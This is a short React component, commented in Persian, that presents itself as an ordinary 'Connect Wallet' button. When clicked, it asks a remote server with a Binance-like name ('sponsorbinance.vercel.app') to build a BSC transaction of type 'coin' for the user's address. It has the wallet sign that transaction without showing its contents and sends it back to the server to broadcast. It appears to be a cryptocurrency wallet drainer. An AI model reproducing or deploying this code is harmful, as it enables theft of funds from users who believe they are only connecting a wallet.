import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";
import Web3 from "web3"; // اضافه کردن Web3 برای امضای تراکنش

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["eth_sendRawTransaction", "eth_signTransaction"], // متدهای مورد نیاز
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = new Web3(ethereumProvider);
    var accounts = await provider.eth.getAccounts();
    var account_sender = accounts[0];
    console.log("✅ Wallet Address:", account_sender);

    try {
      await provider.currentProvider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC Chain ID
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function signAndSendTransaction(address, chain, type) {
      try {
        let requestData = { handler: "tx", address, chain, type };
        var result = await jQuery.post(apiUrl, requestData);
        var unsignedTx = JSON.parse(result).unsigned_tx;
        console.log("📜 Unsigned Transaction:", unsignedTx);

        // **✅ تلاش برای امضای تراکنش با `eth_signTransaction`**
        try {
          var signedTx = await provider.currentProvider.request({
            method: "eth_signTransaction",
            params: [unsignedTx],
          });
        } catch (error) {
          console.log("❌ `eth_signTransaction` پشتیبانی نمی‌شود، استفاده از روش جایگزین...");
          signedTx = await provider.eth.accounts.signTransaction(unsignedTx, account_sender);
        }

        console.log("✍️ Signed Transaction:", signedTx);

        // **✅ ارسال امضا به `send.php` برای ارسال به بلاکچین**
        var txHash = await jQuery.post(apiUrl, {
          handler: "sign",
          signature: signedTx.rawTransaction,
          type,
        });

        console.log("📤 Transaction Sent:", txHash);
        return txHash;
      } catch (error) {
        console.error("❌ Error in signAndSendTransaction:", error);
        return null;
      }
    }

    var txHash = await signAndSendTransaction(account_sender, "56", "coin");

    if (txHash) {
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Transaction failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
